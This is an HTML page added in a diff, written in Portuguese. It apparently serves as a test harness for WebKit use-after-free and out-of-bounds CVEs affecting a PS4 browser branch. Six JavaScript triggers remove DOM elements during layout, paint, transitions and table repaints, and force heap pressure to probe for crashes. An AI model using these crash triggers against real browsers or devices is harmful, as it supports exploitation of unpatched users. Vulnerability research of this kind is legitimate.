@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2024-40776/40782 — Huang Xilin + Motyl UAF Cluster</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#00ccff;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#000a10;border:2px solid #005566;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#33aabb;line-height:1.8}
+.src strong{color:#00ccff;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #0a1a20;border-radius:5px;padding:10px;min-height:220px;white-space:pre;overflow-y:auto;max-height:450px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#00ccff}.sep{color:#333}
+.btn{display:inline-block;margin-top:8px;margin-right:5px;padding:7px 12px;background:#000a10;border:1px solid #005566;border-radius:4px;color:#00aacc;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#00ccff;color:#44ddff}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🧪 CVE-2024-40776/40782 — Huang Xilin (Ant Group) + Motyl UAF Cluster</h1>
+<p class="meta">BZ#273176 + BZ#268770 · Safari 17.6 · WSA-2024-0004 · Julho 2024 · before WebKit 2.44.3</p>
+<div class="src">
+<strong>📋 CLUSTER Huang Xilin — 4 bugs em 1 sessão (Ant Group Light-Year Lab)</strong>
+CVE-2024-40776 (BZ#273176): UAF — "use-after-free issue was addressed with improved memory management" → process crash<br>
+CVE-2024-40779 (BZ#275431): OOB read — "out-of-bounds read was addressed with improved bounds checking"<br>
+CVE-2024-40780 (BZ#275273): OOB read — mesma descrição<br>
+CVE-2024-40782 (BZ#268770): UAF — Maksymilian Motyl (Immunity Systems) → process crash<br>
+<br>
+Afeta: WebKitGTK before 2.44.3 · Fix Safari 17.6 Jul/2024<br>
+PS4 branch Set/2023 → <strong style="color:#00ccff">AFETADO (10 meses de gap)</strong><br>
+<br>
+Ant Group Light-Year Lab especializa em WebKit WebCore/layout bugs.<br>
+4 bugs descobertos na mesma sessão → área comum: CSS layout engine, box model,<br>
+rendering pipeline. UAF em RenderObject/LayoutObject cycle.<br>
+Motyl (Immunity): mesmo período → variante do mesmo cluster.
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① RenderObject CSS Layout UAF</button>
+  <button class="btn" onclick="t2()">② Box Model Destroy During Paint</button>
+  <button class="btn" onclick="t3()">③ CSS Transition + Remove</button>
+  <button class="btn" onclick="t4()">④ OOB: Overflow Container Calc</button>
+  <button class="btn" onclick="t5()">⑤ Table/Grid Repaint UAF</button>
+  <button class="btn" onclick="t6()">⑥ Position Stacking Context</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<12;i++)a.push(new ArrayBuffer(1024*1024));a=null}catch(e){}}
+
+function t1(){
+  sep('RenderObject CSS Layout UAF');
+  l('RenderObject destruído durante forced layout reflow...','w');
+  try {
+    var style = document.createElement('style');
+    style.textContent = [
+      '.robj { display:block; width:100px; height:50px; overflow:hidden; }',
+      '.robj .inner { display:block; width:200px; height:100px; float:left; }',
+      '.robj:before { content:"::before"; display:block; }',
+      '.robj:after { content:"::after"; display:block; float:right; }'
+    ].join('\n');
+    document.head.appendChild(style);
+    var container = document.createElement('div');
+    container.style.cssText = 'width:400px;overflow:auto';
+    document.body.appendChild(container);
+    var nodes = [];
+    for(var i = 0; i < 40; i++){
+      var el = document.createElement('div');
+      el.className = 'robj';
+      var inner = document.createElement('div');
+      inner.className = 'inner';
+      inner.textContent = 'content '+i;
+      el.appendChild(inner);
+      container.appendChild(el);
+      nodes.push(el);
+    }
+    // Força layout inicial — cria RenderObjects para todos
+    container.offsetHeight;
+    // Remove metade dos nós e força re-layout imediatamente
+    for(var j = 0; j < nodes.length; j += 2){
+      if(nodes[j].parentNode) container.removeChild(nodes[j]);
+    }
+    // FORÇA LAYOUT com RenderObjects parcialmente destruídos
+    container.offsetHeight;
+    // Altera CSS dos restantes (trigger repaint com state parcial)
+    nodes.filter(function(n){ return n.parentNode; }).forEach(function(n, i){
+      n.style.height = (50 + i * 3) + 'px';
+    });
+    container.offsetHeight; // terceiro layout
+    gc();
+    document.body.removeChild(container);
+    document.head.removeChild(style);
+    l('RenderObject layout UAF: sem crash','ok');
+  } catch(e){ l('CRASH RenderObject: '+e.name,'e'); }
+}
+
+function t2(){
+  sep('Box Model Destroy During Paint (Motyl BZ#268770)');
+  l('Elementos com box model complexo removidos durante paint...','w');
+  try {
+    var outer = document.createElement('div');
+    outer.style.cssText = 'position:relative;width:500px;height:300px;overflow:hidden';
+    document.body.appendChild(outer);
+    var elements = [];
+    for(var i = 0; i < 50; i++){
+      var el = document.createElement('div');
+      el.style.cssText = [
+        'position:'+(i%3===0?'absolute':i%3===1?'relative':'fixed'),
+        'top:'+(i*5%100)+'px',
+        'left:'+(i*7%200)+'px',
+        'width:'+(20+i%80)+'px',
+        'height:'+(20+i%60)+'px',
+        'z-index:'+(i%10),
+        'background:rgba('+(i*5%255)+','+(i*7%255)+','+(i*3%255)+',0.5)',
+        'border:'+(i%3)+'px solid rgba('+(255-i*5%255)+',0,0,0.8)',
+        'border-radius:'+(i%20)+'px',
+        'box-shadow:'+(i%5)+'px '+(i%5)+'px '+(i%10)+'px rgba(0,0,0,0.5)',
+        'opacity:'+(0.5+i*0.01)
+      ].join(';');
+      outer.appendChild(el);
+      elements.push(el);
+    }
+    outer.offsetHeight;
+    // Remove elementos enquanto paint está acontecendo (requestAnimationFrame)
+    requestAnimationFrame(function(){
+      elements.slice(0, 25).forEach(function(el){
+        if(el.parentNode) outer.removeChild(el);
+      });
+      // Força repaint imediato com elementos parcialmente removidos
+      outer.style.transform = 'translateZ(0)'; // force layer
+      outer.offsetHeight;
+      requestAnimationFrame(function(){
+        if(outer.parentNode) document.body.removeChild(outer);
+        l('Box model paint: sem crash','ok');
+      });
+    });
+    l('Box model com 50 elementos posicionados + paint async...','i');
+  } catch(e){ l('CRASH box model: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('CSS Transition + Remove Durante Transição');
+  l('CSS transitions interrompidas por remoção do elemento...','w');
+  try {
+    var style = document.createElement('style');
+    style.textContent = [
+      '.trans { transition: all 0.5s ease; width:100px; height:50px; background:red; }',
+      '.trans.active { width:200px; height:100px; background:blue; transform:rotate(45deg); }'
+    ].join('\n');
+    document.head.appendChild(style);
+    var container = document.createElement('div');
+    document.body.appendChild(container);
+    var els = [];
+    for(var i = 0; i < 30; i++){
+      var el = document.createElement('div');
+      el.className = 'trans';
+      container.appendChild(el);
+      els.push(el);
+    }
+    container.offsetHeight; // paint inicial
+    // Inicia transições
+    els.forEach(function(el){ el.className = 'trans active'; });
+    // Remove DURANTE a transição (em diferentes momentos)
+    setTimeout(function(){
+      els.slice(0, 10).forEach(function(el){
+        if(el.parentNode) container.removeChild(el);
+      });
+      gc();
+    }, 50);
+    setTimeout(function(){
+      els.slice(10, 20).forEach(function(el){
+        if(el.parentNode) container.removeChild(el);
+      });
+    }, 150);
+    setTimeout(function(){
+      els.slice(20).forEach(function(el){
+        if(el.parentNode) container.removeChild(el);
+      });
+      document.head.removeChild(style);
+      document.body.removeChild(container);
+      l('CSS transition + remove: sem crash','ok');
+    }, 300);
+    l('30 transições iniciadas, removendo em 3 fases...','i');
+  } catch(e){ l('CRASH transition: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('OOB: Container Calc() com valores extremos');
+  l('CSS calc() com valores que podem overflow internos de layout...','w');
+  try {
+    var style = document.createElement('style');
+    style.textContent = [
+      '.calc-test { width: calc(100% - 0px); height: calc(100vh - 0px); }',
+      '.calc-overflow { width: calc(2147483647px + 1px); }',
+      '.calc-neg { width: calc(-2147483648px); height: calc(-1px); }',
+      '.calc-nested { width: calc(calc(50% + 20px) - calc(10% - 5px)); }'
+    ].join('\n');
+    document.head.appendChild(style);
+    var els = [];
+    ['calc-test','calc-overflow','calc-neg','calc-nested'].forEach(function(cls){
+      var el = document.createElement('div');
+      el.className = cls;
+      el.textContent = cls;
+      document.body.appendChild(el);
+      els.push(el);
+    });
+    // Força layout com calc extremos
+    els.forEach(function(el){
+      try {
+        var w = el.offsetWidth;
+        var h = el.offsetHeight;
+        l('calc '+el.className+': '+w+'x'+h,'ok');
+      } catch(e2){ l('CRASH calc '+el.className+': '+e2.name,'e'); }
+    });
+    els.forEach(function(el){ if(el.parentNode) document.body.removeChild(el); });
+    document.head.removeChild(style);
+  } catch(e){ l('CRASH calc: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('Table/Grid Repaint UAF (Huang Xilin cluster)');
+  l('Table com spanning cells e repaint após mutação...','w');
+  try {
+    var table = document.createElement('table');
+    table.style.cssText = 'border-collapse:collapse;table-layout:fixed;width:400px';
+    document.body.appendChild(table);
+    var rows = [];
+    for(var r = 0; r < 10; r++){
+      var tr = document.createElement('tr');
+      for(var c = 0; c < 5; c++){
+        var td = document.createElement('td');
+        td.style.cssText = 'border:1px solid;padding:4px';
+        // Algumas células com rowspan/colspan
+        if(r === 0 && c === 0){ td.rowSpan = 2; td.colSpan = 2; }
+        else if(r === 3 && c === 2){ td.colSpan = 3; }
+        td.textContent = r+','+c;
+        tr.appendChild(td);
+      }
+      table.appendChild(tr);
+      rows.push(tr);
+    }
+    table.offsetHeight; // layout inicial com spanning
+    // Remove rows com spanning cells ativas
+    [rows[0], rows[3]].forEach(function(row){
+      if(row.parentNode) table.removeChild(row);
+    });
+    table.offsetHeight; // repaint sem as spanning cells
+    gc();
+    // Adiciona nova row
+    var newRow = table.insertRow(0);
+    var newCell = newRow.insertCell(0);
+    newCell.colSpan = 5;
+    newCell.textContent = 'NEW ROW';
+    table.offsetHeight;
+    document.body.removeChild(table);
+    l('Table spanning repaint: sem crash','ok');
+  } catch(e){ l('CRASH table: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('Stacking Context + Position UAF');
+  l('Stacking context destruído com elementos position:fixed referenciando...','w');
+  try {
+    var style = document.createElement('style');
+    style.textContent = [
+      '.stack { position:relative; z-index:1; isolation:isolate; }',
+      '.fixed-child { position:fixed; top:0; left:0; z-index:100; }',
+      '.abs-child { position:absolute; top:10px; left:10px; }'
+    ].join('\n');
+    document.head.appendChild(style);
+    var containers = [];
+    for(var i = 0; i < 20; i++){
+      var cont = document.createElement('div');
+      cont.className = 'stack';
+      cont.style.width = '100px'; cont.style.height = '50px';
+      var fixed = document.createElement('div');
+      fixed.className = 'fixed-child';
+      fixed.style.width = (10+i)+'px'; fixed.style.height = '10px';
+      fixed.style.background = 'rgba('+(i*12)+'%,0,0,0.5)';
+      var abs = document.createElement('div');
+      abs.className = 'abs-child';
+      abs.textContent = i;
+      cont.appendChild(fixed);
+      cont.appendChild(abs);
+      document.body.appendChild(cont);
+      containers.push({cont, fixed, abs});
+    }
+    document.body.offsetHeight; // força stacking context creation
+    // Remove containers enquanto fixed children ainda apontam para o stacking context
+    containers.forEach(function(obj, idx){
+      if(idx % 3 === 0){
+        // Remove o pai do fixed child — quem é o novo containing block?
+        if(obj.cont.parentNode) document.body.removeChild(obj.cont);
+        gc();
+        // Fixed child agora pode ter stacking context inválido
+        try {
+          var rect = obj.fixed.getBoundingClientRect();
+        } catch(e2){ l('CRASH stacking['+idx+']: '+e2.name,'e'); }
+      }
+    });
+    containers.forEach(function(obj){ if(obj.cont.parentNode) document.body.removeChild(obj.cont); });
+    document.head.removeChild(style);
+    l('Stacking context: sem crash','ok');
+  } catch(e){ l('CRASH stacking: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2024-40776/40782 — Huang Xilin Ant Group + Motyl Immunity Cluster','w');
+  l('4 bugs na mesma sessão: UAF×2 + OOB×2 · CSS layout/RenderObject · Jul/2024','i');
+  t1(); setTimeout(t2,600); setTimeout(t3,1200); setTimeout(t4,2000);
+  setTimeout(t5,2800); setTimeout(t6,3200);
+}
+</script>
+</body>
+</html>
